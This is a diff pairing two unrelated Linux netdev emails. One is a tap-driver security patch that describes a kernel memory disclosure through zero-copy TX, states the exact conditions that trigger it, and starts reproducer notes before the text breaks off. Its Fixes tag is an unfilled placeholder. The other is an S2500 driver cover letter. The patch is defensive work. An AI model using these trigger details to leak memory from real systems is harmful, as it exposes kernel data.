@@ -1,98 +1,79 @@
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=209.85.215.172
-ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
-	t=1794588549;
-	b=2gNJeL8wHo7sdqJukGDUstRCtLR4xtEGusifisla0F1iCTubu7I8doEhnageIS/1/nAm
-	 Wr52X0c0Qtp4e8rzUgGjN4d1WSaahMpawmC/YnnLtTtXwGQkwvU0JC80kS5hCQj/CiS/V
-	 v6cvOpX+dITp0QE/KjP7Ngq085r4pc2xyhBaIvJVGWTCcXiytshJMBf78fqFMP/nGxHM2
-	 Jk1YV/QaiDwjZi+l22DsRJW2C9cV4+Fxlk+BmE2dahrleMrLaPbvu2JF3mhCbh3gwYZXD
-	 87TLnVGXBNrIA8cJx6nT+eVx0C+usADUq56EeVWcJgtXwIiZINcsdFZ3Zfdd2KblQ/w==
-ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
-	a=rsa-sha256; c=relaxed/relaxed; t=1794588549;
-	h=DMARC-Filter:Received:DKIM-Signature:X-Google-DKIM-Signature:
-	 X-Forwarded-Encrypted:X-Gm-Message-State:X-Gm-Gg:X-Received:Received:
-	 From:To:Cc:Subject:Date:Message-ID:X-Mailer:MIME-Version:Content-Type:
-	 Content-Transfer-Encoding;
-	bh=SmgwxTA2D8UXR1ESuEPmiQgFBOPUQp82p9qIDG2QJA4=;
-	b=mXIeZzoDZmYzeUTxdu/BzpqG4QU8bmpPfiehJqR+KsGPecF7WbuEHbjmT3Eoi4f3sBHA
-	 1XvXPUY0e0GPhQwH3g5uwANZIBM8Ny+cS9mVUQ4KqpODDGJsbmkyMaX9AhNPgHVlW9jpp
-	 GgjJufJPz99isCAYq4hIhmgmcm7r2C++7r6jQpLEpW4+IOJkL3OuIdpEcQ0GRlP7dXg+e
-	 /DYU8HsY5L70SsIkQIS9MoRuW2FJzqKu8f9Nre7iovUD/ad2BaOOo2ED6uRAtHPF6jqTh
-	 PvPpzYFoDyeYC4mtn0Ogew1OSUbGMkcvo2hIRU7DsnutvtCwGc71MUdAWTT8WuLUtZw==
-ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
-	dmarc=pass header.from=gmail.com;
-	spf=pass smtp.mailfrom=gmail.com;
-	dkim=pass header.d=gmail.com header.i=@gmail.com header.a=rsa-sha256 header.s=20260707 header.b=Wyi7ihqI;
-	arc=none smtp.remote-ip=209.85.215.172
-Received: from mail-pg1-f172.google.com (mail-pg1-f172.google.com [209.85.215.172])
-	(using TLSv1.3 with cipher TLS_AES_128_GCM_SHA256 (128/128 bits)
+Authentication-Results: smtp.subspace.kernel.org; arc=pass header.oldest-pass=0 smtp.remote-ip=100.103.45.18
+ARC-Seal: i=2; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=pass;
+	t=1794589170;
+	b=jfQ7U2rS5vXgxNX4cNMCBR2oDBVRbev73tlHn/IPvkihAY2Ee/GOTKBzYLVtpRajGD99
+	 exzbB3k4qhFo9EYFwOtgcagpB//80vaXc4BW+yb2f875mIPg8mpLoLafh0DfFLiDe/p1B
+	 xo0w/IsEmb5tdhPTBULkNpSF4Sj8iM0Rd34conKhBkIsz/zKUSX3Z7SzQFWlCb0A30SdO
+	 TQ5CeJrkAeug7iVuS6q6CT1qBPdwluyJAOMiWkiGH9cIK8ctA2/hzoHc9PjiFqoRjPtnQ
+	 8TFGKPZWgDtogD2PFGF+T6f3mksNFq0SGRhmtDfPkZuxIx3jiKsOeSLZzIAg8UDTryg==
+ARC-Message-Signature: i=2; d=subspace.kernel.org; s=arc20261015;
+	a=rsa-sha256; c=relaxed/relaxed; t=1794589170;
+	h=Received:DKIM-Signature:Received:From:Subject:Date:Message-Id:
+	 MIME-Version:Content-Type:Content-Transfer-Encoding:X-B4-Tracking:To:
+	 Cc:X-Mailer:X-Developer-Signature:X-Developer-Key:X-Endpoint-Received:
+	 X-Original-From:Reply-To;
+	bh=a5AEqQ0Q9CU6uILx3jmLLUXLvw6A66c2udjlKpLKQWk=;
+	b=jYmu4gWpF3Vt6Wa9wTDabfhuOghI5t3YFC+xZCd90vey5mcXsqvsFs7ODuwHFTXOipvU
+	 ULlyTzRa8821ooDXtbOodi6Lfv8H4EEigod02+/oPyt906196VlMbDMTAk/4fjQf94ELO
+	 vmJ7wmjL8eUI0f8PQJjVQZv03lELrmvX2NfhAVCrptm/n1NRgIU9xftwvZK708xOUA+3X
+	 KZizPwsc5vtO6pGbP9DuM/1gnQVYehnx26onHwby7mgKHGl8IsQZbIRAbakUbae9qhdxa
+	 Hs4AizIzTnM0wGSUkHYtDdmu/QjL2ICxzNsilFahrOli7BRSWocBPiTNqF2lKc+1thw==
+ARC-Authentication-Results: i=2; smtp.subspace.kernel.org; 
+	dkim=pass header.d=kernel.org header.i=@kernel.org header.a=rsa-sha256 header.s=k20260515 header.b=Ytei4xbY;
+	arc=pass header.oldest-pass=0 smtp.remote-ip=100.103.45.18
+Received: from smtp.kernel.org (quasi.space.kernel.org [100.103.45.18])
+	(using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
+	 key-exchange X25519 server-signature ECDSA (prime256v1))
+	(No client certificate requested)
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id C070B606A32D;
+	Fri, 13 Nov 2026 16:59:30 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org;
+	dkim=pass (2048-bit key) header.d=kernel.org header.i=@kernel.org header.a=rsa-sha256 header.s=k20260515 header.b=Ytei4xbY
+Authentication-Results: smtp.kernel.org; arc=none smtp.remote-ip=100.80.115.77
+ARC-Seal: i=1; d=kernel.org; s=arc20260519; a=rsa-sha256; cv=none;
+	t=1794589170;
+	b=2JN04TlFJNZnueaL5BC8NnXrMME7dPau/s1ccCRquguM4yHL54TLaTa8Pk/a3VRHvkEF
+	 sWM9niQAoKHJ1V1CNtu5Vdjx+mu/L13Szc26eMDJ5nG/sDLQzUdWlPokJW5UKB6dKSKvm
+	 E2Tbrr+xE4KLnBSc+a6lrxZ6YW+XcPfkakJPJN0V0RKqlUsFr2q81bmoi60dT0EV4hvtR
+	 lkdKXafsEs2S4mqXVlt1Ylxf+9aysVwJUQG27soweJHaTjEggXEqSoUdXY1IyaqkWEPvm
+	 N3SQddoKrNGPpkjPni0cBe6XJZubqTgIgWgFUq+VDMXLlsN/S1VbKA/idBXRPLm+vgQ==
+ARC-Message-Signature: i=1; d=kernel.org; s=arc20260519; a=rsa-sha256;
+	c=relaxed/relaxed; t=1794589170;
+	h=DKIM-Signature:Received:From:Subject:Date:Message-Id:MIME-Version:
+	 Content-Type:Content-Transfer-Encoding:X-B4-Tracking:To:Cc:X-Mailer:
+	 X-Developer-Signature:X-Developer-Key:X-Endpoint-Received:
+	 X-Original-From:Reply-To;
+	bh=a5AEqQ0Q9CU6uILx3jmLLUXLvw6A66c2udjlKpLKQWk=;
+	b=AWxcSWyFSMYYQZcXornwYcdQ+d+Pyu6vKuby1cc7TLyNf/w3EHfl1LnP2rcS5ONnK55X
+	 Nk+3cUDut2lFKhQkjeboS+t1OIDPoHpAhoHJQEceUjDOoVtAt+K8ETClek4c2UWChiug7
+	 4wL+uj9MpUt7D0AfszXfrnMZRFPKJqZWeto9JIbkEZFeRmljA6TxXwdChf57FpwSYn26F
+	 wXDOQAwHOEVqSv41K76IlXPwwA1YQWqNpsFDe8W89at8/stBvPqQmBfRPIFUo2ag8SyV+
+	 VGEsw7Vn7n6iu4D3qZJ/MeELgEa1fLl8MKVTZfAuvl5gjDcTK+/YgsxBmViww/eDo4w==
+ARC-Authentication-Results: i=1; smtp.kernel.org; 
+	arc=none smtp.remote-ip=100.80.115.77
+Received: from lkml.kernel.org (nexus.subspace.kernel.org [100.80.115.77])
+	(using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 8634C606AFE5
-	for <netdev@vger.kernel.org>; Fri, 13 Nov 2026 16:49:08 +0000 (UTC)
-DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org 8634C606AFE5
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
-Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.a=rsa-sha256 header.s=20260707 header.b=Wyi7ihqI
-Received: by mail-pg1-f172.google.com with SMTP id 41be03b00d2f7-cdd89d84521so851293a12.1
-        for <netdev@vger.kernel.org>; Fri, 13 Nov 2026 08:49:08 -0800 (PST)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20260707; t=1794588548; x=1795193348; darn=vger.kernel.org;
-        h=content-transfer-encoding:content-type:mime-version:message-id:date
-         :subject:cc:to:from:from:to:cc:subject:date:message-id:reply-to
-         :content-type;
-        bh=SmgwxTA2D8UXR1ESuEPmiQgFBOPUQp82p9qIDG2QJA4=;
-        b=Wyi7ihqIZSwUEi54diQfmQOadzzA+cTODHpSPANcYL7cgxEgTEg/40LhonGFV4+Ym+
-         7FMf4xWovj+REe3tGWtftakKkn+sNM60Xtg+glnPNFSzRdAsic5r8gt6bn1d1J9zOxcW
-         HDqcc+TVHMxmMCDKgAOnpCptP1WrFMS9jh9Rd1dgjYsfyNyq1WU0FTs9h2YEQFfcjLkO
-         RG7h+niLbUHrni9WmzjhubHHJVNMvLBlAwZ2rm1WwnPQ8RODhAq7lfbnO9dUXBTvrF9d
-         ENqrVwMpxBs2ttZCxOtEuEE+W25BMc2fqbU0oGI1o86ql90TvP0GmuPg+p3FOj4JL6Ul
-         Ia+A==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20260707; t=1794588548; x=1795193348;
-        h=content-transfer-encoding:content-type:mime-version:message-id:date
-         :subject:cc:to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject
-         :date:message-id:reply-to:content-type;
-        bh=SmgwxTA2D8UXR1ESuEPmiQgFBOPUQp82p9qIDG2QJA4=;
-        b=sH7KLjwRrC4rBfaJiH82DNRo7a27Ys0YlgP3ZZFGQUMnL4PI22HgRJkRSpo/SSTPiX
-         qZDhTNQ/9uQcQ+gP3t8WYREYuJ+QnOPYuRCDXQ5QMuI1/D4mYKxHu1Lz5Cj2x17zXRWY
-         CC8WdgiR4YBVgaxlgby7QrtUuNHe50ZDra7Fl23IPJEr7ZIOuR9KAo8/Id5X9HPmZxDw
-         NGvs8PCXE+eG0TYHzb3PnHpDYuqstMTQ3oNcB2LS/EpotgXebjS3mH7v89OHb8P1AtX/
-         SMnDrziz3VTrKSD67Onrpx6jVml/lE/SkXRI7n/a/c3zrtpNBnEZg62Wrp2fOXljMQHB
-         QGmw==
-X-Forwarded-Encrypted: i=1; AL+hErGpmcv7oK4A1jN7K+/R1jYCXeAuzDSo4m3BIlL8Wa56m+ZGkpttuvL//fx6HfeqEFJ6vgeU6r4=@vger.kernel.org
-X-Gm-Message-State: APuU4Z8mU6Zxd9JxoHGXGSvV44wyZ+QEZxhL/Lbr8DbkcAEW9cUaKe2z
-	VThCNHjC46YNbHq1a3u4zsdwiAksEtg+ds/VAWDT+NZddsNJ8VMSy5jynMPFpo8r
-X-Gm-Gg: AYBFou2z68/q6zZqHotHnU6foZYWbcw9SpDrIwYwte8CE+L0cMxB6BYXPTg5F29PEOF
-	p0rUwvCEjyWynDXLTpApq1mG33iz4XwANkKAuYJBa1iiEOubJcMVwDCr9eymvOMaPl78ppV3FkD
-	wbEpe7W3RlV8/DtZgzLuxE7O6BomTNBD/8CUE3dxAtlEvhqXlkYxSqkYgu8bIY0Si49FShhvP65
-	NKACr2MmY5XJ1X9VW9Gnr0/HIqn3m8/5nSCYZvzP3mKjHq2QZ392NB/dIMVdIZ3uSu60THUKMEe
-	CkZ5GcYTkb+iXDDgkTwbrR9QUdfKl5hSH4zaV/onNleAYFJxheT1ZXhfV3fZRnJMjKKa4UuI42w
-	v1sEtc7Y76S6D72afDfEapC/smsmVaaAp8v3aROEZ3N6k6QB+h098szI37GFB4TRbGkwxbxz5+p
-	SHEGhRcoQhUF/aOq4KofX3Ug1Ie39/a/DP4KMC+8h8yOo6aA+a3JWHNtd9uS8FCjzwxtQ9vUukW
-	apTUR+hWjnyQ7XEiYhhXsHAH8slssZ4/Iou8OJ7rZMoE0t7CXAmMLiELtA054DBTCW2fUq7FrBg
-	L7yKsl+y4KmH3zTBU2Dk7lhC4aGB4EVun0gA8HK/tEDar8tIew==
-X-Received: by 2002:a17:90b:584b:b0:3b1:d40:2c4e with SMTP id 98e67ed59e1d1-3b1b05b69damr1969728a91.0.1794588547741;
-        Fri, 13 Nov 2026 08:49:07 -0800 (PST)
-Received: from localhost.localdomain ([112.170.44.210])
-        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-3b197ce49d6sm10589154a91.4.2026.11.13.08.49.04
-        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
-        Fri, 13 Nov 2026 08:49:07 -0800 (PST)
-From: Junyoung Jang <graypanda.inzag@gmail.com>
-To: Willem de Bruijn <willemdebruijn.kernel@gmail.com>,
-	Jason Wang <jasowangio@gmail.com>,
-	Andrew Lunn <andrew+netdev@lunn.ch>,
-	"David S. Miller" <davem@davemloft.net>,
-	Eric Dumazet <edumazet@kernel.org>,
-	Jakub Kicinski <kuba@kernel.org>,
-	Paolo Abeni <pabeni@redhat.com>
-Cc: Junyoung Jang <graypanda.inzag@gmail.com>,
-	netdev@vger.kernel.org,
-	linux-kernel@vger.kernel.org
-Subject: [PATCH net] tap: clamp zero-copy copylen to remaining payload length
-Date: Sat, 14 Nov 2026 01:49:01 +0900
-Message-ID: <20261113164903.785381-1-graypanda.inzag@gmail.com>
-X-Mailer: git-send-email 2.43.0
+	by smtp.kernel.org (Postfix) with ESMTPS id 90C941F000C4;
+	Fri, 13 Nov 2026 16:59:29 +0000 (UTC)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=kernel.org;
+	s=k20260515; t=1794589170;
+	bh=a5AEqQ0Q9CU6uILx3jmLLUXLvw6A66c2udjlKpLKQWk=;
+	h=From:Subject:Date:To:Cc:Reply-To;
+	b=Ytei4xbY5m3847VfRBKXXB9Yv9PbkJ0+rwCIFv21tiB+46vAqeUv8JS4bNjRuyHPZ
+	 wNhHN70rYt/c00oAmwRKZbx55EXpb1r++vJH6LJGVob23Vub2AanhmJ8ScZjqhFt4c
+	 tLCk+V5YdCfEvpVIHEu8RDti+FJhl3M2GWQs9lpCN0jC3le75xXEtXiAf+kWSeXZBm
+	 +NmsH4NwYAOQa6sOg9g3/m3n6MgY8vwPrj2vKwXlsHAXbsMmFjbxkgtJEDF/bl892i
+	 RvPtk6ISABdTF1w6j+oc/Fy1MaKxv4gUm9QK0zLDWV34IG5YpY+bykdx/XYvSAbEAh
+	 p2PfCQ0rb19Yw==
+Received: from nexus.subspace.kernel.org (localhost [IPv6:::1])
+	by lkml.kernel.org (Postfix) with ESMTP id DECE549A0F;
+	Fri, 13 Nov 2026 16:59:28 +0000 (UTC)
+From: Selvamani Rajagopal via B4 Relay <devnull+Selvamani.Rajagopal.onsemi.com@kernel.org>
+Subject: [PATCH net-next v11 00/14] (no cover subject)
+Date: Fri, 13 Nov 2026 08:59:19 -0800
+Message-Id: <20261113-s2500-mac-phy-support-v11-0-7a186141952c@onsemi.com>
 X-Mailing-List: netdev@vger.kernel.org
 List-Id: <netdev.vger.kernel.org>
 List-Post: <mailto:netdev@vger.kernel.org>
@@ -102,331 +83,240 @@ List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
 List-Owner: <mailto:netdev+owner@vger.kernel.org>
 Precedence: list
 MIME-Version: 1.0
-Content-Type: text/plain; charset=UTF-8
-Content-Transfer-Encoding: 8bit
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: 7bit
+X-B4-Tracking: v=1; b=H4sIAOlB92oC/3XQwW7DIAwG4FepOI/JJgFDT3uPaQcgzppJTaKQR
+ q2qvvtoNq2dIo5g+/vBV5F46jiJ/e4qJl661A19PiC+7EQ8+P6TZdfkC6FAGTCAMikNII8+yvF
+ wkek0jsM0y7qtPDsFbaBK5Nlx4rY7r/C76HmWPZ9n8fFTSafwxXG+s/feQ5fmYbqsb1jqdeI3T
+ RfSllqCbDinRayiaezb0Cc+dq9xOK4hi35isC4xOjPWWaoDqZaU3jDmiVGuxJjMoI1MLpcrwg1
+ DD4bAlhjKTE02WiLv0bsNYx+MU0XGZoYYEL2PsYIt4/4YBCh+yt1XHLllbCC00GwYhIeDYEoOQ
+ oYqDNobF6wO9A+63W7fy7HmvIQCAAA=
+To: Selva Rajagopal <selvamani.rajagopal@onsemi.com>, 
+ Andrew Lunn <andrew+netdev@lunn.ch>, 
+ "David S. Miller" <davem@davemloft.net>, Jakub Kicinski <kuba@kernel.org>, 
+ Paolo Abeni <pabeni@redhat.com>, Rob Herring <robh@kernel.org>, 
+ Krzysztof Kozlowski <krzk+dt@kernel.org>, 
+ Conor Dooley <conor+dt@kernel.org>, 
+ Parthiban Veerasooran <parthiban.veerasooran@microchip.com>, 
+ Simon Horman <horms@kernel.org>, Jonathan Corbet <corbet@lwn.net>, 
+ Shuah Khan <skhan@linuxfoundation.org>, 
+ Randy Dunlap <rdunlap@infradead.org>, 
+ Richard Cochran <richardcochran@gmail.com>, Andrew Lunn <andrew@lunn.ch>, 
+ Heiner Kallweit <hkallweit1@gmail.com>, 
+ Russell King <linux@armlinux.org.uk>, Eric Dumazet <edumazet@kernel.org>, 
+ Piergiorgio Beruto <piergiorgio.beruto@gmail.com>, 
+ Eric Dumazet <edumazet@kernel.org>
+Cc: Selva Rajagopal <Selvamani.Rajagopal@onsemi.com>, 
+ netdev@vger.kernel.org, devicetree@vger.kernel.org, 
+ linux-kernel@vger.kernel.org, linux-doc@vger.kernel.org, 
+ Jerry Ray <jerry.ray@microchip.com>, 
+ Ciprian Regus <ciprian.regus@analog.com>, 
+ Krzysztof Kozlowski <krzysztof.kozlowski@oss.qualcomm.com>
+X-Mailer: b4 0.13.0
+X-Developer-Signature: v=1; a=ed25519-sha256; t=1794589162; l=9258;
+ i=Selvamani.Rajagopal@onsemi.com; s=20260531; h=from:subject:message-id;
+ bh=Q7u++2+ia99ofeeV7c7KuHVHI+2bSLsv96doH7MQEJ8=;
+ b=ZDdKCWf6WR7a5lEaDG7UN/wTsADOgN/tGaM8IpEe7hV2Px2DDndDYjtufIbjxB6Kxtvnv7rPr
+ DdQYbxDpemmChwC944uasCYH5O63MYxPsVPA/ZjRhwlHCJ/7OcjlLCY
+X-Developer-Key: i=Selvamani.Rajagopal@onsemi.com; a=ed25519;
+ pk=5QRdM0HS/LGWWcUZZ9hVfZ+qbPQGZCumcTXOiN7Fyug=
+X-Endpoint-Received: by B4 Relay for
+ Selvamani.Rajagopal@onsemi.com/20260531 with auth_id=803
+X-Original-From: Selvamani Rajagopal <Selvamani.Rajagopal@onsemi.com>
+Reply-To: Selvamani.Rajagopal@onsemi.com
 
-In tap_get_user(), q->vnet_hdr_sz is subtracted from len after
-consuming the virtio header from the input iterator, and frames shorter
-than ETH_HLEN are rejected. In the zero-copy TX branch, however,
-copylen is computed without bounding it to the remaining frame length:
+Changes in v11:
+- Create new patches to move vendor changes to its own patch
+- Improve commit message to be more informative of the changes
+- Add clarity to kernel documentation in oa-tc6-framework.rst
+- Fix issues potential Oops issue in S2500 driver.
+- Add logic to take care of frame drop bit from MAC-PHY 
+- Link to v10: https://lore.kernel.org/r/20261106-s2500-mac-phy-support-v10-0-31b5a69b85b7@onsemi.com
 
-    copylen = clamp(hdr_len ?: GOODCOPY_LEN, ETH_HLEN, good_linear);
+Support for onsemi's S2500 10Base-T1S MAC-PHY
 
-When vhost-net experimental zero-copy TX is enabled and the configured
-TUNSETVNETHDRSZ header is large enough for the total descriptor to meet
-vhost-net's 256-byte zero-copy threshold while leaving fewer than
-GOODCOPY_LEN (128) frame bytes, a zero hdr_len sets copylen to 128.
+This patch series brings support for onsemi's S2500 that iss
+IEEE 802.3cg compliant Ethernet transceiver with an integrated
+Media Access Controller (MAC-PHY)
 
-For example, with a 260-byte descriptor consisting of a 246-byte padded
-virtio header and a 14-byte Ethernet frame, tap_alloc_skb() sets the
-skb linear length to 128 bytes, whereas zerocopy_sg_from_iter() copies
-only the remaining 14 bytes from the iterator. dev_queue_xmit() then
-transmits the extra 114 uninitialized bytes from the skb head onto the
-underlying link, disclosing stale kernel memory contents in the
-forwarded frame.
+Driver implementation is compatible and works with OA TC6
+framework that is already present. S2500 driver supports
+hardware timestamping. Along with this driver, OA TC6
+frame work is also changed to add hardware timestamping
+support.
 
-Clamp copylen to len so the skb linear length never exceeds the
-remaining payload bytes. len is already verified to be at least
-ETH_HLEN earlier in tap_get_user().
+Driver has support for running selftest and loopback tests.
+Through ethtool, it can provide traffic stats, rmon stats,
+and timestamping related traffic stats.
 
-Fixes: <12자리_커밋_해시> ("<원본_커밋_제목>")
-Signed-off-by: Junyoung Jang <graypanda.inzag@gmail.com>
+As S2500 has an internal PHY, changes have been added
+to onsemi's PHY driver to support this device.
+
+To: Andrew Lunn <andrew@lunn.ch>
+To: Heiner Kallweit <hkallweit1@gmail.com>
+To: Russell King <linux@armlinux.org.uk>
+To: David S. Miller <davem@davemloft.net>
+To: Eric Dumazet <edumazet@google.com>
+To: Jakub Kicinski <kuba@kernel.org>
+To: Paolo Abeni <pabeni@redhat.com>
+To: Andrew Lunn <andrew+netdev@lunn.ch>
+To: Parthiban Veerasooran <parthiban.veerasooran@microchip.com>
+To: Selva Rajagopal <selvamani.rajagopal@onsemi.com>
+To: Richard Cochran <richardcochran@gmail.com>
+To: Rob Herring <robh@kernel.org>
+To: Krzysztof Kozlowski <krzk+dt@kernel.org>
+To: Conor Dooley <conor+dt@kernel.org>
+To: Simon Horman <horms@kernel.org>
+To: Jonathan Corbet <corbet@lwn.net>
+To: Shuah Khan <skhan@linuxfoundation.org>
+To: Randy Dunlap <rdunlap@infradead.org>
+To: Eric Dumazet <edumazet@kernel.org>
+To: Piergiorgio Beruto <piergiorgio.beruto@gmail.com>
+Cc: netdev@vger.kernel.org
+Cc: linux-kernel@vger.kernel.org
+Cc: devicetree@vger.kernel.org
+Cc: linux-doc@vger.kernel.org
+Cc: Jerry Ray <jerry.ray@microchip.com>
+Cc: Ciprian Regus <ciprian.regus@analog.com>
+Signed-off-by: Selvamani Rajagopal <Selvamani.Rajagopal@onsemi.com>
+
+Changes in v10:
+ - Removed config_intr callback in S2500 PHY driver
+ - Removed writing status0/config0 from s2500 driver
+ - Implemented API to set tx credit threshold and 
+   to enable RX cut-through mode
+ - Drop the frame when frame drop bit in footer is set
+ - Module name restored back to oa_tc6.ko from oa_tc6_mod.ko
+- Link to v9: https://lore.kernel.org/r/20261009-s2500-mac-phy-support-v9-0-dcefe1d0bf0d@onsemi.com
+
+Changes in v9:
+- Renamed the new phy API from having "fixed_speed" to "no_speed"
+- Fixed compilation issue due to having changes in the wrong patch
+- Added the MAINTAINERS changes to where files were introduced.
+- Fixed coding style issues reported.
+- Moved the order of patches so that selftest changes goes after
+  s2500 support.
+- Made Pier's email ID consistent across to be consistent across 
+  the codebase.
+
+- Link to v8: https://lore.kernel.org/r/20260928-s2500-mac-phy-support-v8-0-7e011aacc309@onsemi.com
+
+Changes in v8:
+- Modified to use newer MMD based read/write APIs
+- clean up by removing unused definitions/initializations
+- Better handling of timestamp capture events by using
+  bit fields so that we don't lose any event
+- timestamp skb queue is protected with spinlock
+- added reset-gpio in YAML file as support is recently added
+- removed ioctl from OA TC6 framework as it is not needed.
+
+- Link to v7: https://lore.kernel.org/all/20260708-s2500-mac-phy-support-v7-0-478c877aa1a9@onsemi.com
+
+Changes in v7:
+- Fixed compiler warning due to prototype mismatch
+- Moved the order of patches to ensure dt-bindings comes first
+  before it is being used
+- Added missing review tag
+- Added missing MODULE_DEVICE_TABLE
+- OA_TC6 framework enables 64 bit timestamping mode by default.
+
+- Compiler related warnings fixed.
+- Link to v6: https://lore.kernel.org/r/20260629-s2500-mac-phy-support-v6-0-18ce79500371@onsemi.com
+
+Changes in v6:
+- Changes to ensure onsemi code stay within 80 columns.
+- Fixed the error of "not described in comments section"
+  in comments section.
+
+- Fixed compiler warnings.
+- Link to v5: https://patch.msgid.link/20260614-s2500-mac-phy-support-v5-0-89874b72f725@onsemi.com
+
+Changes in v5:
+ - kernel doc related changes in oa_tc.c, onsemi driver files and
+  oa tc6 rst file
+- Link to v4: https://lore.kernel.org/r/20260605-s2500-mac-phy-support-v4-0-de0fbc13c6d8@onsemi.com
+
+Changes in v4:
+ - Added return value comment for genphy_read/write_phy_mmd functions
+ - Added genphy_loopback_fixed_speed helper function to be used in
+   set_loopback callbacks
+ - Updated networking documentation for OA TC6 framework to elaborate
+   on what is expected in the ptp_clock_info structure for registration.
+ - added spi-max-frequency in YAML file based on alert from sashiko-bot
+ - Removed model/version from the onsemi driver's private structure as
+   they were useful as "information-only" data.
+ - Replaced the non-standard selftest with Linux's standard selftest
+   and made it as a separate patch
+ - Changed bit manipulation, shift operations to use macros so that
+   it is clean and readable.
+ - added new read_register and write_register apis with _mms postfix
+   so that MMS (memory map selector) can be given as a parameter.
+ - Fixed the wrong condition check with NETIF_F_RXFCS to subtract
+   FCS size from the length of the frame.
+ - Link to v3: https://lore.kernel.org/r/CY8PR02MB92499C9080614FA3CEB8CD0483162@CY8PR02MB9249.namprd02.prod.outlook.com
+
+Changes in v3:
+ - Moved OA TC6 framework to its own directory.
+ - Split changes to smaller patches based on feedback.
+ - Added PHY loopback support as a separate patch.
+ - New, read and write register APIs with extra parameter MMS
+ - Link to v2: https://lore.kernel.org/r/CY8PR02MB924920C8825C7AE5D22EFA4483382@CY8PR02MB9249.namprd02.prod.outlook.com
+
+Changes in v2:
+ - API to add vendor specific MMS to mdio device map.
+ - Link to v1: https://lore.kernel.org/r/CY8PR02MB9249D083B637477C254F9B0583322@CY8PR02MB9249.namprd02.prod.outlook.com
+
 ---
-Verification and reproducer notes:
+Selvamani Rajagopal (14):
+      dt-bindings: net: add onsemi's S2500
+      Documentation: networking: Add timestamp related APIs to OA TC6 framework
+      net: ethernet: oa_tc6: Move oa_tc6.c to its own directory
+      net: ethernet: oa_tc6: Move constant definitions to header file
+      net: ethernet: microchip: lan865x: Depends on PTP_1588_CLOCK_OPTIONAL
+      net: ethernet: adi: adin1140: Depends on PTP_1588_CLOCK_OPTIONAL
+      net: ethernet: oa_tc6: Support for hardware timestamp
+      net: ethernet: oa_tc6: Drop frames if footer has FD bit set
+      net: phy: ncn26000: Enable enhanced noise immunity
+      net: ethernet: onsemi: s2500: Add driver support for S2500
+      net: ethernet: onsemi: s2500: Add selftest support
+      net: phy: Add helper to modify only the PHY loopback bit
+      net: phy: ncn26000: Support for onsemi's S2500 internal phy
+      net: phy: dp83867: Use genphy_loopback_no_speed()
 
-Tested on Linux 7.4.0-rc2 (commit 067c5c24cef2) in an x86-64 QEMU/KVM
-guest (2 vCPUs, CONFIG_MACVTAP=y, CONFIG_VHOST_NET=y, CONFIG_VETH=y)
-booted with vhost_net.experimental_zcopytx=1 and init_on_alloc=0.
+ .../devicetree/bindings/net/onnn,s2500.yaml        |  71 +++
+ Documentation/networking/oa-tc6-framework.rst      |  81 +++-
+ MAINTAINERS                                        |  11 +-
+ drivers/net/ethernet/Kconfig                       |  13 +-
+ drivers/net/ethernet/Makefile                      |   3 +-
+ drivers/net/ethernet/adi/Kconfig                   |   1 +
+ drivers/net/ethernet/microchip/lan865x/Kconfig     |   1 +
+ drivers/net/ethernet/oa_tc6/Kconfig                |  16 +
+ drivers/net/ethernet/oa_tc6/Makefile               |   7 +
+ .../ethernet/{oa_tc6.c => oa_tc6/oa_tc6_main.c}    | 504 ++++++++++++++++-----
+ drivers/net/ethernet/oa_tc6/oa_tc6_ptp.c           |  68 +++
+ drivers/net/ethernet/oa_tc6/oa_tc6_std_def.h       | 173 +++++++
+ drivers/net/ethernet/oa_tc6/oa_tc6_tstamp.c        | 224 +++++++++
+ drivers/net/ethernet/onsemi/Kconfig                |  21 +
+ drivers/net/ethernet/onsemi/Makefile               |   6 +
+ drivers/net/ethernet/onsemi/s2500/Kconfig          |  20 +
+ drivers/net/ethernet/onsemi/s2500/Makefile         |   6 +
+ drivers/net/ethernet/onsemi/s2500/s2500_ethtool.c  | 388 ++++++++++++++++
+ drivers/net/ethernet/onsemi/s2500/s2500_hw_def.h   | 151 ++++++
+ drivers/net/ethernet/onsemi/s2500/s2500_main.c     | 498 ++++++++++++++++++++
+ drivers/net/ethernet/onsemi/s2500/s2500_ptp.c      | 156 +++++++
+ drivers/net/phy/Kconfig                            |   2 +-
+ drivers/net/phy/dp83867.c                          |  11 +-
+ drivers/net/phy/ncn26000.c                         |  67 ++-
+ drivers/net/phy/phy_device.c                       |  24 +
+ include/linux/oa_tc6.h                             |  32 ++
+ include/linux/phy.h                                |   2 +
+ 27 files changed, 2412 insertions(+), 145 deletions(-)
+---
+base-commit: d1f4b7c6b997c29de67ad7178ababac2328cb1b4
+change-id: 20260601-s2500-mac-phy-support-4f3ae920fb73
 
-An October 2026 public report covered the analogous short-payload
-arithmetic issue in drivers/net/tun.c:
-https://lists.openwall.net/linux-kernel/2026/10/22/806
-
-Before this patch (non-KASAN build), spraying 256 frames and submitting
